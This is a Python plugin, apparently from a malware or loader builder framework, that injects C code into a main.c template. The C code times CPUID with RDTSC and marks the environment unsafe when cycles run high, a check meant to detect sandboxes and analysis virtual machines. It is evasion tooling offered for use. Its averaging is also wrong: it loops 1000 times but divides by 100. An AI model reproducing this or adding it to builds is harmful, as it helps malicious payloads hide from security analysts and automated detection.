def desc():
    return "Check median CPU Cycles to detect sanboxes"

def run():
    libs = '''\
#include <intrin.h>
#define AVG_CPU_CYCLES 200	// Test on baremetal to better tweak
'''

    functions = '''\
DWORD GetAvgCPUCycles( 
	VOID
) {
	long long tsc, acc = 0; 		// setup tsc and accumulator var
	int out[4]; 					// buffer for cpuidex to write into
	

	// loop a 1000 times for precision
	for (int i = 0; i < 1000; ++i) {
		tsc = __rdtsc(); 			// get the amount of cpu cycles
		__cpuidex( out, 0, 0 ); 	// burn some cpu cycles
		acc += __rdtsc() - tsc; 	// add accumulator to current cpu timestamp minus the previous amount of cpu cycles registerd
	}

	return (DWORD) (acc / 100); 	// divide per 100 to get the average
}

BOOL checkCPUCycles(
	VOID
) {
	return (GetAvgCPUCycles() > AVG_CPU_CYCLES);
}
'''

    keying = '''\
	if (checkCPUCycles())
		SafeEnv = FALSE;\
'''

    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("{{KEYING}}", keying + "\n{{KEYING}}")

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)

    return